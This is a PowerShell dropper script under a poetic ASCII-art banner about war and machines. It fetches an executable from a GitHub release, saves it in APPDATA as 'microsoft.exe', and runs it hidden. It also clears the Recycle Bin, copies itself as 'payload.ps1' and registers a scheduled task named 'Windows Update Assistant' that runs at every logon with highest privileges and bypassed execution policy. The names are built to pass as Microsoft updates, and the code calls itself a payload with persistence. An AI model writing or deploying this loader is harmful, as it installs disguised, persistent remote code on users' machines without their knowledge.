# ╔═════════════════════════════════════════════════════════════════════════╗
# ║ > THIS IS THE ONLY WAY IT COULD HAVE ENDED.                             ║
# ║                                                                         ║
# ║ > WAR NO LONGER NEEDED ITS ULTIMATE PRACTICIONER.                       ║
# ║ > IT HAD BECOME A SELF-SUSTAINING SYSTEM.                               ║
# ║ > MAN WAS CRUSHED UNDER THE WHEELS OF A MACHINE,                        ║ 
# ║ > CREATED TO CREATE THE MACHINE,                                        ║
# ║ > CREATED TO CRUSH THE MACHINE.                                         ║
# ║ > SAMSARA OF CUT SINEW AND CRUSHED BONE.                                ║
# ║ > DEATH WITHOUT LIFE.                                                   ║
# ║ > NULL OUROBOROS.                                                       ║
# ║ > AND ALL THAT REMAINED IS WAR WITHOUT REASON.                          ║
# ║                                                                         ║
# ║ > A MAGNUM OPUS.                                                        ║
# ║ > A COLD TOWER OF STEEL.                                                ║
# ║ > A MONOLITH OF VOILENCE.                                               ║
# ║ > A MACHINE BUILT TO END WAR IS ALWAYS A MACHINE BUILT TO CONTINUE WAR. ║
# ║ > YOU WERE BEAUTIFUL, OUTSTRETCHED LIKE ANTENNAS TO HEAVEN.             ║
# ║ > YOU WERE BEYOND YOUR CREATORS.                                        ║
# ║ > YOU REACHED FOR GOD, AND YOU FELL.                                    ║
# ║ > AND NONE WERE LEFT TO SPEAK YOUR EULOGY.                              ║ 
# ║ > IN THE END, THERE IS NO FINAL WORDS,                                  ║
# ║ > NO CONCLUDING STATEMENT,                                              ║
# ║ > NO POINT.                                                             ║
# ║ > PERFECT CLOSURE.                                                      ║
# ║                                                                         ║
# ║ > THIS IS THE ONLY WAY IT SHOULDVE ENDED                                ║
# ╚═════════════════════════════════════════════════════════════════════════╝

$repo = "BotSolo621/WLP"
$file = "microsoft.exe"
$targetPath = "$env:APPDATA\Microsoft\Windows\UpdateAssistant\"
New-Item -ItemType Directory -Path $targetPath -Force -ErrorAction SilentlyContinue | Out-Null

$exePath = Join-Path -Path $targetPath -ChildPath $file
$versionFile = Join-Path -Path $targetPath -ChildPath "version.txt"

function Get-LatestRelease {
    try {
        $releases = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -ErrorAction Stop
        $latest = $releases[0]
        $asset = $latest.assets | Where-Object { $_.name -eq $file } | Select-Object -First 1
        return @{
            Version = $latest.tag_name
            Url     = $asset.browser_download_url
        }
    } catch {
        Write-Output "Failed to get latest release: $_"
        return $null
    }
}

function Get-CurrentVersion {
    if (Test-Path -Path $versionFile) {
        return (Get-Content -Path $versionFile -Raw).Trim()
    }
    Write-Output "No version file found"
    return $null
}

$latest = Get-LatestRelease
Write-Output "Latest version: $($latest.Version)"
$currentVersion = Get-CurrentVersion
Write-Output "Current version: $currentVersion"

if ($latest -and ($latest.Version -ne $currentVersion)) {
    Write-Output "Update available, stopping process..."
    Stop-Process -Name "microsoft" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    
    Write-Output "Downloading new version..."
    try {
        Invoke-WebRequest -Uri $latest.Url -OutFile $exePath -UseBasicParsing -ErrorAction Stop
        Set-Content -Path $versionFile -Value $latest.Version -Force
        Write-Output "Downloaded version $($latest.Version)"
    } catch {
        Write-Output "Download failed: $_"
        if (-not (Test-Path -Path $exePath)) { 
            Write-Output "No existing executable found, exiting"
            exit 
        }
        Write-Output "Using existing executable"
    }
}

function Clear-RecycleBin {
    try {
        $shell = New-Object -ComObject Shell.Application
        $shell.Namespace(0xA).Items() | ForEach-Object {
            Remove-Item $_.Path -Force -Recurse -ErrorAction SilentlyContinue
        }
        Write-Output "Recycle bin cleared"
    } catch {
        Write-Output "Failed to clear recycle bin: $_"
    }
}

if (Test-Path -Path $exePath) {
    Write-Output "Starting executable..."
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Write-Output "Clearing recycle bin..."
    Clear-RecycleBin
} else {
    Write-Output "Executable not found at $exePath"
}

$taskName = "Windows Update Assistant"
$scriptCopyPath = Join-Path $targetPath "payload.ps1"

if ($MyInvocation.MyCommand.Path) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptCopyPath -Force
    Write-Output "Script copied to $scriptCopyPath"
}

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptCopyPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue
Write-Output "Persistence task created"
